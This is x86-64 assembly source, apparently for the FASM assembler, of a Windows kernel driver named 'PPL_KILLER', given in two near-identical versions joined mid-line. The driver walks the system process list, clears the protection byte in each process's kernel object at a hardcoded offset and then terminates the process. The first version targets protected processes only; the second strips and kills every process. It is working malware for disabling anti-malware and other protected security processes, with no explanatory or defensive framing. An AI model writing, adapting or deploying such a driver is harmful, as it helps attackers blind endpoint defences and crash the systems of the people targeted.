format PE64 native
entry DriverEntry
include 'win64a.inc'
include 'data.inc'

CODE
proc DriverEntry DriverObject, RegistryPath 
	MOV 	RAX,[DriverObject]
	LEA 	R8,[OnUnload]
	MOV 	[RAX+68H],R8          
	
	SUB 	RSP, 28H
	CALL    PPL_KILLER
	
	XOR 	EAX,EAX 
	RET
endp

proc PPL_KILLER
	LEA 	RCX, [SystemProcessInformation]
	XOR 	RDX, RDX 
	XOR 	R8, R8 
	LEA 	R9, [infoSize]
	CALL 	[ZwQuerySystemInformation]
	CMP 	EAX, 0C0000004h
	JNE @F 
	
	MOV     RDX, [infoSize]   
	SHL     RDX, 1             
	XOR     RCX, RCX           
	MOV     R8, 'PPLL'       
	CALL    [ExAllocatePoolZero]
	TEST 	RAX, RAX 
	JZ @F 
	MOV 	[pInfoBuffer], RAX 
	
	LEA 	RCX, [SystemProcessInformation]
	MOV 	RDX, RAX 
	MOV 	R8, [infoSize] 
	SHL 	R8, 1
	XOR 	R9, R9 
	CALL 	[ZwQuerySystemInformation] 
	TEST 	EAX, EAX 
	JS FREE_EX
	
	MOV 	RAX, [pInfoBuffer]
	MOV 	[pCurrentEntry], RAX 
.LOOP:
	MOV 	RAX, [pCurrentEntry]
	MOV     RCX, [RAX + 80h] 
	MOV     [savedPid], RCX
	LEA 	RDX, [Process]
	CALL 	[PsLookupProcessByProcessId]
	TEST 	EAX, EAX 
	JS .NEXT 
	
	MOV 	RAX, [Process] 
	MOV 	ECX, [PsProtectionOffset]
	MOVZX 	EAX, byte [RAX + RCX]
	AND 	EAX, 07h
	CMP 	EAX, 00h
	JE .DEREF

	; protection = 0
	MOV 	RAX, [Process]
	MOV 	ECX, [PsProtectionOffset]
	MOV 	byte [RAX + RCX], 0 
	; =======================================
	MOV 	RCX, [savedPid]
	XOR 	RDX, RDX 
	CALL 	[ZwTerminateProcess]
	; =======================================
.DEREF:
	MOV 	RCX, [Process]
	CALL 	[ObfDereferenceObject]
	
.NEXT:
	MOV     RAX, [pCurrentEntry]
    MOV     ECX, [RAX]             
    TEST    ECX, ECX
    JZ      FREE_EX
    ADD     RAX, RCX
    MOV     [pCurrentEntry], RAX
    JMP     .LOOP
	
FREE_EX:
	MOV 	RCX, [pInfoBuffer]
	XOR 	RDX, RDX 
	CALL 	[ExFreePoolWithTag]
	RET
@@:
	RET 
endp 

proc OnUnload DriverObject 
	RET
endp

DATA 
align 16 
SystemProcessInformation dd 5
ProtectedLight db 1 

; ====================
align 8
savedPid dq  0
Process dq  0
pInfoBuffer dq 0
infoSize dq 0
pCurrentEntry dq 0
NumUnprotected dq 0 
PsProtectionOffset dd 087Ah

IMPORTS
library ntoskrnl, 'ntoskrnl.exe'

import ntoskrnl,\
       PsLookupProcessByProcessId, 'PsLookupProcessByProcessId',\
       ObfDereferenceObject, 'ObfDereferenceObject',\
       ZwQuerySystemInformation, 'ZwQuerySystemInformation',\
       ExAllocatePoolZero, 'ExAllocatePoolZero',\
       ExFreePoolWithTag, 'ExFreePoolWithTag',\
       PsIsSystemProcess, 'PsIsSystemProcess',\
       ZwTerminateProcess, 'ZwTerminateProcess'format PE64 native
entry DriverEntry
include 'win64a.inc'
include 'data.inc'

CODE
proc DriverEntry DriverObject, RegistryPath 
	MOV 	RAX,[DriverObject]
	LEA 	R8,[OnUnload]
	MOV 	[RAX+68H],R8          
	
	SUB 	RSP, 28H
	CALL    PPL_KILLER
	
	XOR 	EAX,EAX 
	RET
endp

proc PPL_KILLER
	LEA 	RCX, [SystemProcessInformation]
	XOR 	RDX, RDX 
	XOR 	R8, R8 
	LEA 	R9, [infoSize]
	CALL 	[ZwQuerySystemInformation]
	CMP 	EAX, 0C0000004h
	JNE @F 
	
	MOV     RDX, [infoSize]   
	SHL     RDX, 1             
	XOR     RCX, RCX           
	MOV     R8, 'PPLL'       
	CALL    [ExAllocatePoolZero]
	TEST 	RAX, RAX 
	JZ @F 
	MOV 	[pInfoBuffer], RAX 
	
	LEA 	RCX, [SystemProcessInformation]
	MOV 	RDX, RAX 
	MOV 	R8, [infoSize] 
	SHL 	R8, 1
	XOR 	R9, R9 
	CALL 	[ZwQuerySystemInformation] 
	TEST 	EAX, EAX 
	JS FREE_EX
	
	MOV 	RAX, [pInfoBuffer]
	MOV 	[pCurrentEntry], RAX 
.LOOP:
	MOV 	RAX, [pCurrentEntry]
	MOV     RCX, [RAX + 80h] 
	MOV     [savedPid], RCX
	LEA 	RDX, [Process]
	CALL 	[PsLookupProcessByProcessId]
	TEST 	EAX, EAX 
	JS .SKIP 

	; protection = 0
	MOV 	RAX, [Process]
	MOV 	ECX, [PsProtectionOffset]
	MOV 	byte [RAX + RCX], 0 
	; =======================================
	MOV 	RCX, [savedPid]
	XOR 	RDX, RDX 
	CALL 	[ZwTerminateProcess]
	; =======================================
	MOV 	RCX, [Process]
	CALL 	[ObfDereferenceObject]

.SKIP:
	MOV     RAX, [pCurrentEntry]
    MOV     ECX, [RAX]             
    TEST    ECX, ECX
    JZ      FREE_EX
    ADD     RAX, RCX
    MOV     [pCurrentEntry], RAX
    JMP     .LOOP
	
FREE_EX:
	MOV 	RCX, [pInfoBuffer]
	XOR 	RDX, RDX 
	CALL 	[ExFreePoolWithTag]
	RET
@@:
	RET 
endp 

proc OnUnload DriverObject 
	RET
endp

DATA 
align 16 
SystemProcessInformation dd 5
ProtectedLight db 1 

; ====================
align 8
savedPid dq  0
Process dq  0
pInfoBuffer dq 0
infoSize dq 0
pCurrentEntry dq 0
NumUnprotected dq 0 
PsProtectionOffset dd 087Ah

IMPORTS
library ntoskrnl, 'ntoskrnl.exe'

import ntoskrnl,\
       PsLookupProcessByProcessId, 'PsLookupProcessByProcessId',\
       ObfDereferenceObject, 'ObfDereferenceObject',\
       ZwQuerySystemInformation, 'ZwQuerySystemInformation',\
       ExAllocatePoolZero, 'ExAllocatePoolZero',\
       ExFreePoolWithTag, 'ExFreePoolWithTag',\
       PsIsSystemProcess, 'PsIsSystemProcess',\
       ZwTerminateProcess, 'ZwTerminateProcess'
